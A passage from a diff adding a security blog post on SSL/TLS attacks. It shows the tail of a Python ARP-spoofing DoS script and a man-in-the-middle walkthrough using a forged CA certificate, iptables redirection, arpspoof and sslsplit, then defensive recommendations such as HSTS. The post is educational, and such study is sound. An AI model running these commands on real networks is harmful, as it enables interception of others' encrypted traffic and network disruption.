class="string">"\s+"</span>,i)</span><br><span class="line">            <span class="keyword">return</span> r[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span><span class="params">(hackip)</span>:</span></span><br><span class="line">    ip=get_gateway_ip()</span><br><span class="line">    hw=get_gateway_hw(ip)</span><br><span class="line">    arp=ARP(op=<span class="number">2</span>,pdst=ip,hwdst=hw,psrc=hackip)</span><br><span class="line">    <span class="comment">#os.popen('ifconfig eth0 %s' % hackip )</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        send(arp)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"USEAGE: sudo python arp_dos.py 192.168.X.XXX"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        help()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hack(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-MITM"><a href="#3-MITM" class="headerlink" title="(3) MITM"></a>(3) MITM</h3><p>Next, we start to launch a man-in-the-middle attack, where, for experimental purposes, we use OpenSSL to generate a certificate</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ openssl genrsa -out ca.key 2048</span><br><span class="line">$ openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</span><br></pre></td></tr></table></figure>
+
+<p>Then, we should forward port traffic on the testing machine by the <code>iptables</code> command</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Open the function of ip_forward if neccessary</span></span><br><span class="line">$ <span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="comment"># Clear the original setting</span></span><br><span class="line">$ iptables -t nat -L</span><br><span class="line">$ iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</span><br><span class="line">$ iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</span><br></pre></td></tr></table></figure>
+
+<p>Here, we use the ARP Spoffing tool for ARP spoofing</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ arpspoof -i eth0 -t 192.168.X.XXX -r 192.168.X.XXX</span><br></pre></td></tr></table></figure>
+
+<p>Finally, we launch the SSLSplit command for the attack</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Conclusion"><a href="#4-Conclusion" class="headerlink" title="(4) Conclusion"></a>(4) Conclusion</h3><p>In this example, we have implemented one of the most “traditional”, easiest examples of certificate spoofing implementing man-in-the-middle attacks.<br>In reality, due to the update of SSL/TLS protocol and the protection of browser and operating system, this attack method has been almost impossible to realize. However, this part of the article is mainly to provide an implementation idea for reference, showing that this attack method is actually cheaper.</p>
+<h2 id="Protection-Recommendations"><a href="#Protection-Recommendations" class="headerlink" title="Protection Recommendations"></a>Protection Recommendations</h2><p>This section is divided into recommendations for protecting against malicious SSL/TLS attacks.</p>
+<h3 id="Choose-a-good-certificate-authority"><a href="#Choose-a-good-certificate-authority" class="headerlink" title="Choose a good certificate authority"></a>Choose a good certificate authority</h3><p>Here are some reference factors for choosing CA</p>
+<ul>
+<li>Large market share</li>
+<li>Clear business focus</li>
+<li>Provide multiple recall mechanisms and a high performance OCSP service.<br>The CA at least provides domain name authentication and extended certificate authentication, ideally allowing you to select your own public key.<br>[8]</li>
+<li>Have good certificate management tools</li>
+<li>Provide good technical support</li>
+</ul>
+<h3 id="Select-the-strong-algorithm-signature-certificate"><a href="#Select-the-strong-algorithm-signature-certificate" class="headerlink" title="Select the strong algorithm signature certificate"></a>Select the strong algorithm signature certificate</h3><p>The security of a certificate signature depends on the strength of the signature private key and the strength of the hash function used.[8]<br>So we need to select a certificate with a strong algorithmic signature.</p>
+<h3 id="Use-secure-cipher-suite"><a href="#Use-secure-cipher-suite" class="headerlink" title="Use secure cipher suite"></a>Use secure cipher suite</h3><p>The premise of secure communication is to confirm the authenticity of both parties.<br>In SSL/TLS, the encryption suite determines how you communicate securely.</p>
+<h3 id="Luauch-HSTS-preload"><a href="#Luauch-HSTS-preload" class="headerlink" title="Luauch HSTS preload"></a>Luauch HSTS preload</h3><p>The service should enable HTTP Strict Transport Security (HTTP Strict Transport Security).</p>
+<h3 id="Support-high-level-security-requirements"><a href="#Support-high-level-security-requirements" class="headerlink" title="Support high level security requirements"></a>Support high level security requirements</h3><p>Support high level security requirements such as ATS standards, HSTS, CAA, protection against degraded attacks, forward confidentiality.</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[1] 深入理解HTTPS工作原理, 浪里行舟， <a href="https://juejin.im/post/5ca6a109e51d4544e27e3048" target="_blank" rel="noopener">https://juejin.im/post/5ca6a109e51d4544e27e3048</a></p>
+<p>[2] Message Digest in Information security, GeeksforGeeks, <a href="https://www.geeksforgeeks.org/message-digest-in-information-security/" target="_blank" rel="noopener">https://www.geeksforgeeks.org/message-digest-in-information-security/</a></p>
+<p>[3] What is Certificate Authority (CA)? – Tips to Get SSL Certificate from Certificate Authority, About SSL, <a href="https://aboutssl.org/certificate-authority/" target="_blank" rel="noopener">https://aboutssl.org/certificate-authority/</a></p>
+<p>[4] SSL漏洞总结, Wh0ale, <a href="https://wh0ale.github.io/2018/12/13/2018-12-13-SSL%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://wh0ale.github.io/2018/12/13/2018-12-13-SSL%E6%BC%8F%E6%B4%9E/</a></p>
+<p>[5] The Heartbleed Bug, Synopsys, <a href="https://heartbleed.com/" target="_blank" rel="noopener">https://heartbleed.com/</a></p>
+<p>[6] New attack steals SSNs, e-mail addresses, and more from HTTPS pages, Dan Goodin,  <a href="https://arstechnica.com/information-technology/2016/08/new-attack-steals-ssns-e-mail-addresses-and-more-from-https-pages/" target="_blank" rel="noopener">https://arstechnica.com/information-technology/2016/08/new-attack-steals-ssns-e-mail-addresses-and-more-from-https-pages/</a></p>
+<p>[7] CRIME attack poc, Thomas Pornin, xorninja, <a href="http://security.blogoverflow.com/2012/09/how-can-you-protect-yourself-from-crime-beasts-successor/" target="_blank" rel="noopener">http://security.blogoverflow.com/2012/09/how-can-you-protect-yourself-from-crime-beasts-successor/</a></p>
+<p>[8] SSL/TLS Deployment Best Practices, Ivan Ristić,  <a href="https://hardenedlinux.github.io/cryptography/2015/07/28/ssl-tls-deployment-1.4.html" target="_blank" rel="noopener">https://hardenedlinux.github.io/cryptography/2015/07/28/ssl-tls-deployment-1.4.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://y1ng.cc/" target="_blank" rel="noopener">BBS</a></li>
+         
+          <li><a href="https://y1ng.org/TheRoadOfSO/">安全运营之路</a></li>
+         
+          <li><a href="https://cissp-wiki.ml/" target="_blank" rel="noopener">CISSP学习指南</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Security-Research-for-SSL-TLS"><span class="toc-number">1.</span> <span class="toc-text">Security Research for SSL&#x2F;TLS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Abstract"><span class="toc-number">1.1.</span> <span class="toc-text">Abstract</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Keywords"><span class="toc-number">1.2.</span> <span class="toc-text">Keywords</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.3.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Principle-of-SSL-TLS"><span class="toc-number">1.4.</span> <span class="toc-text">The Principle of SSL&#x2F;TLS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Attack-Techniques-for-SSL-TLS"><span class="toc-number">1.5.</span> <span class="toc-text">Vulnerability Attack Techniques for SSL&#x2F;TLS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Man-in-the-Middle-Attack"><span class="toc-number">1.5.1.</span> <span class="toc-text">Man-in-the-Middle Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Downgrade-Attack"><span class="toc-number">1.5.2.</span> <span class="toc-text">Downgrade Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BEAST-Attack"><span class="toc-number">1.5.3.</span> <span class="toc-text">BEAST Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Heartbleed-Attack"><span class="toc-number">1.5.4.</span> <span class="toc-text">Heartbleed Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HEIST-Attack"><span class="toc-number">1.5.5.</span> <span class="toc-text">HEIST Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRIME-Attack"><span class="toc-number">1.5.6.</span> <span class="toc-text">CRIME Attack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Case-Analysis-and-Actual-Combat"><span class="toc-number">1.6.</span> <span class="toc-text">Case Analysis and Actual Combat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Prepare"><span class="toc-number">1.6.1.</span> <span class="toc-text">(1) Prepare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Data-traffic-redirection"><span class="toc-number">1.6.2.</span> <span class="toc-text">(2) Data traffic redirection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-MITM"><span class="toc-number">1.6.3.</span> <span class="toc-text">(3) MITM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Conclusion"><span class="toc-number">1.6.4.</span> <span class="toc-text">(4) Conclusion</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Protection-Recommendations"><span class="toc-number">1.7.</span> <span class="toc-text">Protection Recommendations</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Choose-a-good-certificate-authority"><span class="toc-number">1.7.1.</span> <span class="toc-text">Choose a good certificate authority</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Select-the-strong-algorithm-signature-certificate"><span class="toc-number">1.7.2.</span> <span class="toc-text">Select the strong algorithm signature certificate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Use-secure-cipher-suite"><span class="toc-number">1.7.3.</span> <span class="toc-text">Use secure cipher suite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Luauch-HSTS-preload"><span class="toc-number">1.7.4.</span> <span class="toc-text">Luauch HSTS preload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Support-high-level-security-requirements"><span class="toc-number">1.7.5.</span> <span class="toc-text">Support high level security requirements</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.8.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&text=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&title=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&is_video=false&description=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Security Research for SSL/TLS&body=Check out this article: https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&title=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&title=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&title=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&title=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&name=Security Research for SSL/TLS&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://y1ng.org/2020/05/28/security/Security-Research-for-SSL-TLS/&t=Security Research for SSL/TLS" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Toky
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://y1ng.cc/" target="_blank" rel="noopener">BBS</a></li>
+         
+          <li><a href="https://y1ng.org/TheRoadOfSO/">安全运营之路</a></li>
+         
+          <li><a href="https://cissp-wiki.ml/" target="_blank" rel="noopener">CISSP学习指南</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-157954403-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
